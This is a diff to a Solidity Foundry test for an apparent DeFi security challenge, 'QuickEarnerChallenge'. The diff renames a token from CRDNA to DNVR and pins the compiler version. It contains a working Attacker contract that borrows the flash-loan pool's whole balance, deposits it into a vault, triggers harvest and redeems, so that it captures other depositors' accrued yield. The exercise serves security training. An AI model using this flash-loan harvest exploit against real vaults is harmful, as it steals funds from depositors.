@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity 0.8.23;
 
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
@@ -24,12 +24,12 @@ contract Attacker is IFlashLoanEtherReceiver {
     }
 
     function attack() public {
-        flashLoanPool.flashLoan(IERC20(theVault.CRDNA()).balanceOf(address(flashLoanPool)));
+        flashLoanPool.flashLoan(IERC20(theVault.DNVR()).balanceOf(address(flashLoanPool)));
     }
 
     function execute() external override {
-        IERC20(theVault.CRDNA()).approve(address(theVault), IERC20(theVault.CRDNA()).balanceOf(address(this)));
-        theVault.deposit(theVault.CRDNA().balanceOf(address(this)), address(this));
+        IERC20(theVault.DNVR()).approve(address(theVault), IERC20(theVault.DNVR()).balanceOf(address(this)));
+        theVault.deposit(theVault.DNVR().balanceOf(address(this)), address(this));
         theVault.harvest(address(this));
         theVault.redeem(theVault.balanceOf(address(this)), address(this), address(this));
     }
@@ -42,7 +42,7 @@ contract QuickEarnerChallenge is Test {
     TheVault private _theVault;
     FlashLoanPool private _flashLoanPool;
 
-    IERC20 public constant CRDNA = IERC20(0x94ab230b92A3f2899e81d46d4E874c6F006c88Aa);
+    IERC20 public constant DNVR = IERC20(0x84BbB983D8cF2F58bd9b2dE794a489d2e9798668);
 
     function setUp() external {
 
@@ -61,10 +61,10 @@ contract QuickEarnerChallenge is Test {
 
         /** PRE ATTACK ASSERTS */
 
-        assertTrue(CRDNA.balanceOf(address(_theVault)) > 0, "QuickEarnerChallenge: LendingPool has no balance"); // a user has already deposited
-        assertTrue(CRDNA.balanceOf(address(_attacker)) == 0, "QuickEarnerChallenge: attacker already has a balance");
+        assertTrue(DNVR.balanceOf(address(_theVault)) > 0, "QuickEarnerChallenge: LendingPool has no balance"); // a user has already deposited
+        assertTrue(DNVR.balanceOf(address(_attacker)) == 0, "QuickEarnerChallenge: attacker already has a balance");
 
-        uint256 _amountToHarvest = CRDNA.balanceOf(address(_theVault)) - _theVault.totalAssets();
+        uint256 _amountToHarvest = DNVR.balanceOf(address(_theVault)) - _theVault.totalAssets();
 
         /** ATTACK */
 
@@ -72,6 +72,6 @@ contract QuickEarnerChallenge is Test {
 
         /** POST ATTACK ASSERTS */
 
-        assertTrue(CRDNA.balanceOf(address(_attacker)) > _amountToHarvest / 2, "QuickEarnerChallenge: attacker did not steal enough");
+        assertTrue(DNVR.balanceOf(address(_attacker)) > _amountToHarvest / 2, "QuickEarnerChallenge: attacker did not steal enough");
     }
 }
